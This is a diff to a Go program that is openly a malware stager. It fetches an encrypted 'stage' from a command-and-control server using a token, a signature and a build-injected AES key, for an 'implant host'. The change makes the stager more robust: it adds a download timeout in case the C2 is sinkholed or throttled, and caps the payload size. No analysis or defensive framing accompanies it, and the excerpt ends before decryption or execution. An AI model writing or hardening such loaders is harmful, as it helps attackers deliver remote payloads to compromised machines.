@@ -11,6 +11,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"time"
 )
 
 var (
@@ -20,8 +21,18 @@ var (
 	KeyHex  string // hex-encoded AES-256-GCM stage key, injected via ldflags
 )
 
+// stageFetchTimeout bounds the stage download: http.Get has no timeout, so a
+// sinkholed or throttled C2 would hang the stager forever with no error.
+const stageFetchTimeout = 30 * time.Second
+
+// stageMaxBytes caps the stage body. A well-formed stage is a few megabytes;
+// anything larger is either corruption or a hostile server, and buffering it
+// unbounded would OOM a small implant host.
+const stageMaxBytes = 64 << 20
+
 func main() {
-	resp, err := http.Get(BaseURL + "/stage/" + Token + "?s=" + Sig)
+	client := &http.Client{Timeout: stageFetchTimeout}
+	resp, err := client.Get(BaseURL + "/stage/" + Token + "?s=" + Sig)
 	if err != nil {
 		os.Stderr.WriteString("error fetching stage: " + err.Error() + "\n")
 		return
@@ -31,10 +42,18 @@ func main() {
 		os.Stderr.WriteString("stage fetch failed: " + resp.Status + "\n")
 		return
 	}
+	if resp.ContentLength > stageMaxBytes {
+		os.Stderr.WriteString("stage too large\n")
+		return
+	}
 
-	body, err := io.ReadAll(resp.Body)
+	body, err := io.ReadAll(io.LimitReader(resp.Body, stageMaxBytes+1))
 	if err != nil {
 		os.Stderr.WriteString("error reading response body: " + err.Error() + "\n")
+		return
+	}
+	if int64(len(body)) > stageMaxBytes {
+		os.Stderr.WriteString("stage too large\n")
 		return
 	}
 
